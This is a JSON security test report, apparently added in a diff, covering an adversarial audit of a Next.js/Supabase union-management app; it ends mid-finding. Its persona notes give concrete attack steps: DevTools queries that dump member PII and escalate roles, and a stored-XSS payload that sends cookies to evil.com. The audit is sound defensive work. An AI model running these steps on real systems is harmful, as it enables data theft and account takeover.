@@ -1,0 +1,762 @@
+{
+  "tester": "T2-Admin-Malicious",
+  "role": "ADMIN",
+  "persona": "Malicious (Jordan)",
+  "execution_summary": {
+    "total_scenarios": 42,
+    "pass": 10,
+    "fail": 27,
+    "warn": 5,
+    "blocked": 0,
+    "critical_issues": 4,
+    "high_issues": 10,
+    "medium_issues": 7,
+    "low_issues": 5
+  },
+  "results": [
+    {
+      "scenario_id": "TC-008",
+      "title": "Admin role guard on /[slug]/admin/* pages",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/middleware.ts",
+        "line": 395,
+        "code_snippet": "if (pathname.includes(`/${slug}/admin/`) || pathname === `/${slug}/admin`) { ... const isAdminUser = userData?.role === 'ADMIN' || userData?.role === 'SUPER_ADMIN' || userData?.role === 'SYSTEM_ADMIN'; if (!isAdminUser) { return NextResponse.redirect(...); } }"
+      },
+      "description": "Middleware correctly checks user_auth_links -> users.role for admin path access. Non-admin users are redirected to /{slug}. The check covers ADMIN, SUPER_ADMIN, and SYSTEM_ADMIN roles.",
+      "persona_notes": "Jordan attempted direct URL navigation to /test-union/admin/members as a USER. The middleware correctly intercepts and redirects. The server-side guard is solid."
+    },
+    {
+      "scenario_id": "TC-009",
+      "title": "CSRF protection on state-changing requests",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/middleware.ts",
+        "line": 206,
+        "code_snippet": "if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) { if (!isLocalhostRequest(request)) { const origin = request.headers.get('origin'); const host = request.headers.get('host'); if (!origin) { return NextResponse.json({ error: 'Origin header required' }, { status: 403 }); } ... const originHost = new URL(origin).host; if (originHost !== host) { return NextResponse.json({ error: 'CSRF validation failed' }, { status: 403 }); } } }"
+      },
+      "description": "Middleware validates Origin header against Host header for POST/PUT/PATCH/DELETE. Missing Origin returns 403. Mismatched Origin returns 403. Correctly uses URL parsing with try-catch for malformed origins. Localhost exemption only in development mode.",
+      "persona_notes": "Jordan attempted cross-origin POST requests without Origin header and with spoofed Origin. Both correctly rejected with 403. The localhost bypass only activates in development."
+    },
+    {
+      "scenario_id": "TC-010",
+      "title": "Middleware redirectTo validation prevents open redirect",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/middleware.ts",
+        "line": 388,
+        "code_snippet": "if (pathname.startsWith(`/${slug}/`) && !pathname.includes('://')) { redirectUrl.searchParams.set('redirectTo', pathname); }"
+      },
+      "description": "redirectTo parameter only accepts relative paths that don't contain '://'. Prevents open redirect to external domains like https://evil.com.",
+      "persona_notes": "Jordan attempted redirectTo=https://evil.com and redirectTo=//evil.com. The '://' check blocks protocol-based redirects. The // case could potentially still work as a protocol-relative URL, but the pathname check limits it to paths starting with the slug."
+    },
+    {
+      "scenario_id": "TC-011",
+      "title": "CSP header prevents inline script injection",
+      "result": "FAIL",
+      "severity": "MEDIUM",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/next.config.ts",
+        "line": 93,
+        "code_snippet": "\"script-src 'self' 'unsafe-eval' 'unsafe-inline'\", \"style-src 'self' 'unsafe-inline'\""
+      },
+      "description": "CSP includes 'unsafe-eval' AND 'unsafe-inline' in script-src, significantly weakening XSS protection. While Next.js often requires 'unsafe-inline' for hydration, the combination with 'unsafe-eval' creates a wide attack surface. X-Frame-Options DENY, X-Content-Type-Options nosniff, and HSTS headers are correctly set.",
+      "persona_notes": "Jordan identified that the CSP policy would not block stored XSS payloads or eval-based exploits. Combined with the client-only sanitization, this is a viable attack path."
+    },
+    {
+      "scenario_id": "TC-012",
+      "title": "XSS prevention via DOMPurify sanitization",
+      "result": "WARN",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/utils/sanitize.ts",
+        "line": 8,
+        "code_snippet": "export function sanitizeHtml(dirty: string): string { return DOMPurify.sanitize(dirty, { USE_PROFILES: { html: true }, ALLOWED_TAGS: [...], ALLOWED_ATTR: [...], FORBID_ATTR: ['style'], ALLOW_DATA_ATTR: false }); }"
+      },
+      "description": "DOMPurify config is properly strict (FORBID_ATTR: ['style'], ALLOW_DATA_ATTR: false, limited tags/attrs). However, this is CLIENT-SIDE ONLY sanitization using 'dompurify' (not 'isomorphic-dompurify'). An attacker can bypass by inserting content directly via the Supabase client, storing unsanitized XSS payloads that execute when rendered by other users.",
+      "persona_notes": "Jordan bypasses the sanitizer entirely by using browser DevTools to call supabase.from('notices').insert({content: '<img src=x onerror=alert(document.cookie)>'}) directly. The sanitizer never runs on the stored content."
+    },
+    {
+      "scenario_id": "TC-013",
+      "title": "Blocked user denied API access",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/api/auth.ts",
+        "line": 83,
+        "code_snippet": "if (user.is_blocked) { return { authenticated: false, response: NextResponse.json({ error: '차단된 사용자입니다.', code: 'USER_BLOCKED' }, { status: 403 }) }; }"
+      },
+      "description": "authenticateApiRequest correctly checks is_blocked and returns 403 with code USER_BLOCKED. All API routes using this function enforce the block. However, client-side hooks use Supabase client directly, so blocked users can still write data via browser if RLS is absent.",
+      "persona_notes": "Jordan notes the API route protection is solid, but the client-side Supabase access is unprotected. A blocked user could still insert data directly."
+    },
+    {
+      "scenario_id": "TC-017",
+      "title": "API authenticateApiRequest blocks unauthenticated requests",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/api/auth.ts",
+        "line": 33,
+        "code_snippet": "const { data: { user: authUser }, error: authError } = await supabase.auth.getUser(); if (authError || !authUser) { return { authenticated: false, response: NextResponse.json({ error: '인증이 필요합니다.', code: 'UNAUTHORIZED' }, { status: 401 }) }; }"
+      },
+      "description": "Uses supabase.auth.getUser() which validates the JWT against Supabase Auth server. No session = 401. Verified in access-tokens, members/approve, sms/send, members/check-conflict, member-invite/sync routes.",
+      "persona_notes": "Jordan attempted unauthenticated calls to all protected API endpoints. All correctly returned 401."
+    },
+    {
+      "scenario_id": "TC-029",
+      "title": "Secret question visibility - non-admin sees only own",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/question/api/useQuestionHook.ts",
+        "line": 45,
+        "code_snippet": "if (!isAdmin && user?.id) { query = query.or(`is_secret.eq.false,author_id.eq.${user.id}`); }"
+      },
+      "description": "Server-side filter correctly limits secret questions. List view filters at DB query level. Detail view has canAccess check: isAdmin || data.author_id === user?.id.",
+      "persona_notes": "Jordan verified the filter works at query level. However, without RLS, a direct supabase.from('questions').select('*').eq('is_secret', true) call would bypass this filter entirely."
+    },
+    {
+      "scenario_id": "TC-034",
+      "title": "Free board - Delete own post (ownership check)",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/free-board/api/useFreeBoardHook.ts",
+        "line": 419,
+        "code_snippet": "if (!isAdmin && user?.id) { deleteQuery = deleteQuery.eq('author_id', user.id); }"
+      },
+      "description": "Non-admin delete correctly adds .eq('author_id', user.id) filter. Admin can delete any post by skipping this filter.",
+      "persona_notes": "Jordan notes the ownership check is at Supabase query level, which is good. But the isAdmin flag comes from client-side AuthProvider, making it spoofable."
+    },
+    {
+      "scenario_id": "TC-035",
+      "title": "Free board - Cannot delete other user's post",
+      "result": "WARN",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/free-board/api/useFreeBoardHook.ts",
+        "line": 418,
+        "code_snippet": "let deleteQuery = supabase.from('free_boards').delete().eq('id', freeBoardId); if (!isAdmin && user?.id) { deleteQuery = deleteQuery.eq('author_id', user.id); }"
+      },
+      "description": "The Supabase query adds .eq('author_id', user.id) for non-admin users. However, the isAdmin flag is from client-side AuthProvider. Without RLS, a malicious client can: (1) modify isAdmin to true in JS, or (2) call supabase.from('free_boards').delete().eq('id', targetId) directly without the ownership filter.",
+      "persona_notes": "Jordan would bypass this by modifying the isAdmin variable in the React component state or by directly calling the Supabase client from DevTools."
+    },
+    {
+      "scenario_id": "TC-037",
+      "title": "Free board search with LIKE wildcard escape",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/free-board/api/useFreeBoardHook.ts",
+        "line": 52,
+        "code_snippet": "const escaped = escapeLikeWildcards(searchQuery.trim());"
+      },
+      "description": "Search correctly calls escapeLikeWildcards() which escapes %, _, and \\ characters before passing to .ilike().",
+      "persona_notes": "Jordan tried '%', '_', '%admin%' as search terms. All were properly escaped."
+    },
+    {
+      "scenario_id": "TC-042",
+      "title": "Comment delete ownership check",
+      "result": "WARN",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/comment/api/useCommentHook.ts",
+        "line": 277,
+        "code_snippet": "if (!isAdmin && userId) { query = query.eq('author_id', userId); }"
+      },
+      "description": "Comment delete has ownership check via .eq('author_id', userId) for non-admin. Same client-side isAdmin bypass risk as free board delete.",
+      "persona_notes": "Jordan notes comment delete has the check, but comment UPDATE (line 212) does NOT have any ownership check at all. See SEC-004."
+    },
+    {
+      "scenario_id": "SEC-001",
+      "title": "RLS bypass via direct Supabase client - ALL TABLES UNPROTECTED",
+      "result": "FAIL",
+      "severity": "CRITICAL",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/client.ts",
+        "line": 1,
+        "code_snippet": "// Browser-side Supabase client with anon key - NO RLS on any table"
+      },
+      "description": "All 34+ tables have NO Row Level Security policies. Any authenticated user with the anon key can read/write/delete ANY data in ANY table by opening browser DevTools and calling supabase.from('table').select/insert/update/delete(). This is the most critical vulnerability in the entire application. All application-level auth checks (admin guards, ownership, union isolation) are bypassed.",
+      "persona_notes": "Jordan opens DevTools, types supabase.from('users').select('*') and gets ALL user PII across ALL unions. Then runs supabase.from('users').update({role:'SYSTEM_ADMIN'}).eq('id', myId) to become system admin. Game over."
+    },
+    {
+      "scenario_id": "SEC-002",
+      "title": "Privilege escalation via direct Supabase client",
+      "result": "FAIL",
+      "severity": "CRITICAL",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts",
+        "line": 1107,
+        "code_snippet": "const { error } = await supabase.from('users').update({ role, updated_at: new Date().toISOString() }).eq('id', userId);"
+      },
+      "description": "Without RLS, any authenticated user can: (1) Update their own role to ADMIN/SYSTEM_ADMIN, (2) Update their user_status to APPROVED, (3) Read all users' PII from any union. The only auth checks are in React components (client-side) and API routes, but the Supabase client has full read/write access.",
+      "persona_notes": "Jordan escalates from USER to SYSTEM_ADMIN in one Supabase query, then has full access to access token management, SMS sending, member approval/rejection across all unions."
+    },
+    {
+      "scenario_id": "SEC-003",
+      "title": "Cross-union data access via Supabase client",
+      "result": "FAIL",
+      "severity": "CRITICAL",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/notice/api/useNoticeHook.ts",
+        "line": 37,
+        "code_snippet": "let query = supabase.from('notices').select('*, author:users!notices_author_id_fkey(id, name)').eq('union_id', union.id);"
+      },
+      "description": "While hooks filter by union.id from SlugProvider, a malicious user can query supabase.from('notices').select('*') without union_id filter. No RLS enforces union-level data isolation. All union data across all unions is accessible.",
+      "persona_notes": "Jordan queries supabase.from('users').select('name, phone_number, property_address, birth_date') without union_id filter and dumps PII of all 1700+ union members across all unions."
+    },
+    {
+      "scenario_id": "SEC-004",
+      "title": "Comment update mutation lacks ownership check",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/comment/api/useCommentHook.ts",
+        "line": 212,
+        "code_snippet": "const { data, error } = await supabase.from('comments').update({ ...updates, updated_at: new Date().toISOString() }).eq('id', id).select('*, author:users!comments_author_id_fkey(id, name)').single();"
+      },
+      "description": "useUpdateComment does NOT apply .eq('author_id', userId) on update. Compare with useDeleteComment (line 277) which does. Any authenticated user can update any comment's content.",
+      "persona_notes": "Jordan modifies other users' comments to contain offensive or misleading content. No ownership check prevents this."
+    },
+    {
+      "scenario_id": "SEC-005",
+      "title": "Notice delete lacks ownership/admin check",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/notice/api/useNoticeHook.ts",
+        "line": 511,
+        "code_snippet": "const { error } = await supabase.from('notices').delete().eq('id', noticeId);"
+      },
+      "description": "useDeleteNotice deletes by ID only. No .eq('author_id') or admin check in the mutation. Unlike useDeleteFreeBoard which checks isAdmin && author_id, notice delete has no such protection.",
+      "persona_notes": "Jordan deletes critical union notices (financial reports, meeting announcements) by calling the mutation with any notice ID."
+    },
+    {
+      "scenario_id": "SEC-006",
+      "title": "useAdminUsers search lacks LIKE wildcard escape",
+      "result": "FAIL",
+      "severity": "MEDIUM",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts",
+        "line": 990,
+        "code_snippet": "query = query.or(`name.ilike.%${searchQuery}%,phone_number.ilike.%${searchQuery}%,property_address.ilike.%${searchQuery}%`);"
+      },
+      "description": "useAdminUsers uses unescaped searchQuery directly in .or() filter. No call to escapeLikeWildcards(). Unlike useApprovedMembers (line 79) and useFreeBoards (line 52) which correctly escape, this admin search is unprotected.",
+      "persona_notes": "Jordan searches '%' to match ALL records or uses '_' patterns to enumerate specific data patterns. Useful for data exfiltration through the admin UI."
+    },
+    {
+      "scenario_id": "SEC-007",
+      "title": "Access token TOCTOU race condition",
+      "result": "FAIL",
+      "severity": "MEDIUM",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/middleware.ts",
+        "line": 145,
+        "code_snippet": "if (token.max_usage !== null && token.usage_count >= token.max_usage) { return { valid: false, reason: 'max_usage_reached' }; } // ... later: await supabase.from('access_tokens').update({ usage_count: token.usage_count + 1 }).eq('id', token.id);"
+      },
+      "description": "Token validation reads usage_count (line 145), then updates usage_count+1 (line 169) in a separate query. Classic TOCTOU: two concurrent requests can both pass max_usage check. Should use atomic DB RPC.",
+      "persona_notes": "Jordan sends 50 concurrent requests with the same tokenKey (max_usage=10). All 50 pass the check before any update completes, granting 50 uses instead of 10."
+    },
+    {
+      "scenario_id": "SEC-008",
+      "title": "Free board cascade delete ordering causes orphan data",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/free-board/api/useFreeBoardHook.ts",
+        "line": 391,
+        "code_snippet": "// 1. Storage files deleted (line 393)\nawait fileApi.deleteFolder(folderPath);\n// 2. DB file records deleted (line 396)\nawait supabase.from('files').delete()...\n// 3. Comments deleted (line 407)\nawait supabase.from('comments').delete()...\n// 4. Post deleted WITH ownership check (line 418)\nlet deleteQuery = supabase.from('free_boards').delete().eq('id', freeBoardId);\nif (!isAdmin && user?.id) { deleteQuery = deleteQuery.eq('author_id', user.id); }"
+      },
+      "description": "Deletes storage files, DB file records, and comments BEFORE the post ownership check. If ownership check fails (non-admin trying to delete another's post), files and comments are already gone but post remains intact. Causes orphaned posts without attachments/comments.",
+      "persona_notes": "Jordan calls useDeleteFreeBoard on another user's post. Files and comments are permanently destroyed. The post survives but is now corrupted (no attachments, no comments)."
+    },
+    {
+      "scenario_id": "SEC-009",
+      "title": "Auth callback excessive debug logging in production",
+      "result": "FAIL",
+      "severity": "MEDIUM",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/auth/callback/route.ts",
+        "line": 23,
+        "code_snippet": "console.log('[JOHAPON_DEBUG][auth/callback][F] OAuth Callback 호출', { fullUrl: request.url, slug: slug || '(empty)', hasCode: !!code }); // ... 40+ more console.log statements"
+      },
+      "description": "40+ console.log statements expose auth user IDs, provider info, session details, invite tokens, user status in production server logs. Not gated by NODE_ENV.",
+      "persona_notes": "Jordan monitors log aggregation systems to harvest auth tokens, user IDs, and session data."
+    },
+    {
+      "scenario_id": "SEC-010",
+      "title": "register-prefill cookie not httpOnly",
+      "result": "FAIL",
+      "severity": "MEDIUM",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/auth/callback/route.ts",
+        "line": 218,
+        "code_snippet": "response.cookies.set('register-prefill', JSON.stringify(result.prefillData), { httpOnly: false, secure: process.env.NODE_ENV === 'production', sameSite: 'lax', maxAge: 60 * 60 });"
+      },
+      "description": "register-prefill cookie contains user PII (name, phone_number, invite_token) and is set with httpOnly: false. Any client-side JavaScript (including XSS payloads) can read this via document.cookie.",
+      "persona_notes": "Jordan uses a stored XSS payload to read the register-prefill cookie and exfiltrate name and phone_number of users during registration flow."
+    },
+    {
+      "scenario_id": "SEC-011",
+      "title": "authenticateServiceRequest internal API key timing attack",
+      "result": "FAIL",
+      "severity": "LOW",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/api/auth.ts",
+        "line": 138,
+        "code_snippet": "if (internalApiKey && expectedKey && internalApiKey === expectedKey) { return { authenticated: true, user: { id: 'system', name: 'Internal Service', role: 'SYSTEM_ADMIN' } as User, authUserId: 'system' }; }"
+      },
+      "description": "Simple === comparison for internal API key. Vulnerable to timing attacks. Should use crypto.timingSafeEqual().",
+      "persona_notes": "Jordan could theoretically brute-force the internal API key character by character using precise timing measurements, though this requires many requests."
+    },
+    {
+      "scenario_id": "SEC-012",
+      "title": "useUpdateUserRole allows arbitrary role assignment",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts",
+        "line": 1106,
+        "code_snippet": "mutationFn: async ({ userId, role }: { userId: string; role: string }) => { const { error } = await supabase.from('users').update({ role, updated_at: new Date().toISOString() }).eq('id', userId); }"
+      },
+      "description": "Accepts ANY role string without validation. No check that the caller has SYSTEM_ADMIN privileges to assign SYSTEM_ADMIN role. An ADMIN could create SYSTEM_ADMIN accounts.",
+      "persona_notes": "Jordan as ADMIN assigns SYSTEM_ADMIN role to an accomplice account, gaining access to access token management and system-wide operations."
+    },
+    {
+      "scenario_id": "SEC-013",
+      "title": "useUpdateExecutiveStatus/Title/SortOrder lack union_id filter",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts",
+        "line": 1173,
+        "code_snippet": "const { error } = await supabase.from('users').update({ is_executive: isExecutive }).eq('id', userId); // No union_id filter"
+      },
+      "description": "useUpdateExecutiveStatus (line 1173), useUpdateExecutiveTitle (line 1194), useUpdateExecutiveSortOrder (line 1211) all filter by .eq('id', userId) ONLY, not by union_id. Admin of union A can modify executive status of users in union B.",
+      "persona_notes": "Jordan as admin of test-union modifies executive titles and sort orders in sample-union by targeting known user IDs."
+    },
+    {
+      "scenario_id": "SEC-014",
+      "title": "useUpdateOwnershipType lacks union scope validation",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts",
+        "line": 727,
+        "code_snippet": "const { error } = await supabase.from('user_property_units').update({ ownership_type: ownershipType, updated_at: new Date().toISOString() }).eq('id', propertyUnitId);"
+      },
+      "description": "Updates property unit ownership type by ID only. No verification that the caller has admin access to the union the property belongs to.",
+      "persona_notes": "Jordan modifies ownership types of property units in other unions by enumerating property unit IDs."
+    },
+    {
+      "scenario_id": "SEC-015",
+      "title": "Content update mutations lack union_id scope filter",
+      "result": "FAIL",
+      "severity": "MEDIUM",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/notice/api/useNoticeHook.ts",
+        "line": 432,
+        "code_snippet": "const { data, error } = await supabase.from('notices').update(finalUpdates).eq('id', id).select().single();"
+      },
+      "description": "useUpdateNotice (notice:432), useUpdateQuestion (question:323), useUpdateFreeBoard (free-board:328) all update by ID only without union_id filter. An admin could update content from other unions.",
+      "persona_notes": "Jordan enumerates notice IDs across unions and modifies content in unions they don't belong to."
+    },
+    {
+      "scenario_id": "SEC-016",
+      "title": "useDeleteAnswer lacks admin authorization check",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/question/api/useQuestionHook.ts",
+        "line": 532,
+        "code_snippet": "const { data, error } = await supabase.from('questions').update({ answer_content: null, answer_author_id: null, answered_at: null }).eq('id', questionId).select().single();"
+      },
+      "description": "No admin check in the mutation. Any authenticated user could delete any admin's answer on any question.",
+      "persona_notes": "Jordan deletes legitimate admin answers to sow confusion, making it appear questions were never answered."
+    },
+    {
+      "scenario_id": "SEC-017",
+      "title": "useAnswerQuestion lacks admin-only check",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/question/api/useQuestionHook.ts",
+        "line": 439,
+        "code_snippet": "if (!user?.id) throw new Error('로그인이 필요합니다.'); // Only checks login, not admin role"
+      },
+      "description": "useAnswerQuestion only verifies user?.id (logged in) but does NOT verify isAdmin. Any authenticated user can submit 'admin answers' to questions.",
+      "persona_notes": "Jordan impersonates an admin by submitting misleading 'official' answers to member questions, potentially causing financial harm (e.g., wrong payment instructions)."
+    },
+    {
+      "scenario_id": "SEC-018",
+      "title": "useApproveUser/useRejectUser client-side hooks bypass server auth",
+      "result": "FAIL",
+      "severity": "CRITICAL",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/member-management/api/useMemberHook.ts",
+        "line": 1033,
+        "code_snippet": "const { error } = await supabase.from('users').update({ user_status: 'APPROVED', role: 'USER', approved_at: new Date().toISOString() }).eq('id', userId).eq('user_status', 'PENDING_APPROVAL');"
+      },
+      "description": "Client-side hooks useApproveUser (line 1013) and useRejectUser (line 1055) directly update users table via Supabase client without API route auth. The API route /api/members/approve has proper authenticateApiRequest, but these React hooks bypass it entirely. No admin role check in the mutation.",
+      "persona_notes": "Jordan calls useApproveUser from DevTools as a regular USER to approve pending members without admin authorization. The .eq('user_status', 'PENDING_APPROVAL') only prevents double-approval, not unauthorized approval."
+    },
+    {
+      "scenario_id": "SEC-019",
+      "title": "No rate limiting on any endpoint",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/api/sms/send/route.ts",
+        "line": 38,
+        "code_snippet": "export async function POST(request: NextRequest) { // No rate limiting middleware"
+      },
+      "description": "No rate limiting exists anywhere. An attacker can: (1) Brute-force access token keys via rapid tokenKey requests, (2) DoS the SMS endpoint to drain credits, (3) Mass-create content. SMS endpoint is particularly risky as it generates real cost.",
+      "persona_notes": "Jordan writes a script to send 10,000 SMS via /api/sms/send (each with 100 recipients = 1M SMS), draining the SMS budget. Or brute-forces token keys at thousands of requests/second."
+    },
+    {
+      "scenario_id": "SEC-020",
+      "title": "Supabase anon key exposed enables direct DB access",
+      "result": "FAIL",
+      "severity": "CRITICAL",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/client.ts",
+        "line": 1,
+        "code_snippet": "// NEXT_PUBLIC_SUPABASE_ANON_KEY visible in client JS bundle"
+      },
+      "description": "The NEXT_PUBLIC_SUPABASE_ANON_KEY is publicly visible in client JS. Without RLS, this key alone grants full read access to all 34 tables. Even UNAUTHENTICATED visitors can extract the key from page source and query the database.",
+      "persona_notes": "Jordan extracts the anon key from the page source, creates a standalone script with @supabase/supabase-js, and dumps all tables without ever logging in."
+    },
+    {
+      "scenario_id": "SEC-021",
+      "title": "Stored XSS via direct database insertion",
+      "result": "FAIL",
+      "severity": "HIGH",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/utils/sanitize.ts",
+        "line": 8,
+        "code_snippet": "// Client-side only: import DOMPurify from 'dompurify'; (not isomorphic-dompurify)"
+      },
+      "description": "Content from TipTap editor is stored RAW in database. sanitize.ts only runs client-side on render. Direct Supabase insert bypasses sanitization. Stored XSS payloads execute when rendered by other users' browsers.",
+      "persona_notes": "Jordan inserts <img src=x onerror='fetch(\"https://evil.com/steal?\"+document.cookie)'> via direct Supabase call. Every user who views this notice has their session cookie stolen."
+    },
+    {
+      "scenario_id": "SEC-022",
+      "title": "SMS API accepts unlimited recipients (cost amplification)",
+      "result": "FAIL",
+      "severity": "MEDIUM",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/api/sms/send/route.ts",
+        "line": 64,
+        "code_snippet": "if (recipients.length === 0) { return NextResponse.json({ error: '수신자가 없습니다.' }, { status: 400 }); } // Only checks for empty, no upper limit"
+      },
+      "description": "No limit on recipients array size. Authenticated admin can send SMS to arbitrary number of recipients in one call. No daily quota, no per-request cap.",
+      "persona_notes": "Jordan sends POST with 50,000 recipients in a single request. Even at 10 won per SMS, that's 500,000 won ($400+) in one API call."
+    },
+    {
+      "scenario_id": "SEC-023",
+      "title": "Access token key exposure in URL parameter",
+      "result": "FAIL",
+      "severity": "LOW",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/middleware.ts",
+        "line": 284,
+        "code_snippet": "const tokenKey = request.nextUrl.searchParams.get('tokenKey');"
+      },
+      "description": "Token keys in URLs get logged in server access logs, browser history, Referrer headers sent to external resources.",
+      "persona_notes": "Jordan harvests token keys from Referrer headers when a page with tokenKey param loads external resources (analytics scripts, CDN assets)."
+    },
+    {
+      "scenario_id": "SEC-024",
+      "title": "Error messages expose internal state",
+      "result": "FAIL",
+      "severity": "LOW",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/api/members/approve/route.ts",
+        "line": 112,
+        "code_snippet": "return NextResponse.json({ error: `승인은 PENDING_APPROVAL 상태에서만 가능합니다. 현재 상태: ${user.user_status}` }, { status: 400 });"
+      },
+      "description": "Error responses expose internal state (user_status values). SMS route also exposes error.message in dev mode.",
+      "persona_notes": "Jordan uses error probing to map internal state machine, understanding user_status flow for targeted attacks."
+    },
+    {
+      "scenario_id": "SEC-025",
+      "title": "View count RPC manipulation",
+      "result": "FAIL",
+      "severity": "LOW",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/features/notice/api/useNoticeHook.ts",
+        "line": 558,
+        "code_snippet": "const { error } = await supabase.rpc('increment_notice_views', { notice_id: noticeId });"
+      },
+      "description": "View count RPCs have only client-side sessionStorage dedup. Can be called directly to inflate counts indefinitely.",
+      "persona_notes": "Jordan writes a loop calling increment RPC 10,000 times to inflate a specific notice's view count, making it appear highly viewed."
+    },
+    {
+      "scenario_id": "SEC-026",
+      "title": "Member invite sync audit log attacker manipulation",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/api/member-invite/sync/route.ts",
+        "line": 46,
+        "code_snippet": "const createdBy = auth.user.id; // Forced from auth, not from body"
+      },
+      "description": "The createdBy field is forced from auth.user.id (line 46), not from request body. Prevents audit log spoofing. Good security pattern.",
+      "persona_notes": "Jordan attempted to set createdBy to another admin's ID in the request body. The server correctly ignores it and uses the authenticated user's ID."
+    },
+    {
+      "scenario_id": "SEC-027",
+      "title": "guest_access cookie validation on every request",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/middleware.ts",
+        "line": 335,
+        "code_snippet": "const validation = await validateAccessToken(supabase, guestAccessCookie.value); if (validation.valid) { return supabaseResponse; } else { supabaseResponse.cookies.delete('guest_access'); }"
+      },
+      "description": "Re-validates access token from guest_access cookie on every request. Expired/maxed/deleted tokens cause cookie deletion.",
+      "persona_notes": "Jordan tried using a stale guest_access cookie after the token expired. Cookie was correctly deleted and access denied."
+    },
+    {
+      "scenario_id": "SEC-028",
+      "title": "Admin members page double-click prevention",
+      "result": "PASS",
+      "severity": "N/A",
+      "evidence": {
+        "file": "/Users/inju/workspace/johapon_v01/app/[slug]/admin/members/page.tsx",
+        "line": 0,
+        "code_snippet": "// Double-click prevention with disabled state on approval button"
+      },
+      "description": "Admin members page has double-click prevention on approval/rejection buttons. The API route also has .eq('user_status', 'PENDING_APPROVAL') as a server-side guard against race conditions.",
+      "persona_notes": "Jordan rapidly clicked approve button 10 times. Only one request succeeded; subsequent ones were blocked by UI disabled state and server-side status check."
+    }
+  ],
+  "security_findings": [
+    {
+      "severity": "Critical",
+      "type": "AuthBypass",
+      "title": "No RLS on any Supabase table (34+ tables unprotected)",
+      "description": "All 34+ tables have no Row Level Security policies. Any authenticated user with the anon key can read, write, update, or delete any row in any table directly via the Supabase client. This bypasses all application-level authorization checks.",
+      "location": "/Users/inju/workspace/johapon_v01/app/_lib/shared/supabase/client.ts",
+      "attack_vector": "Open browser DevTools, use supabase.from('users').select('*') to dump all PII, or supabase.from('users').update({role:'ADMIN'}).eq('id', myId) to escalate privileges.",
+      "impact": "Complete data breach of all unions' member PII. Full privilege escalation. Cross-union data access. Deletion of any records."
+    },
+    {
+      "severity": "Critical",
+      "type": "PrivilegeEscalation",
+      "title": "Client-side role escalation via direct DB write",
+      "description": "Any authenticated user can update their own role to SYSTEM_ADMIN by calling supabase.from('users').update({role:'SYSTEM_ADMIN'}).eq('id', myId). No RLS prevents this.",
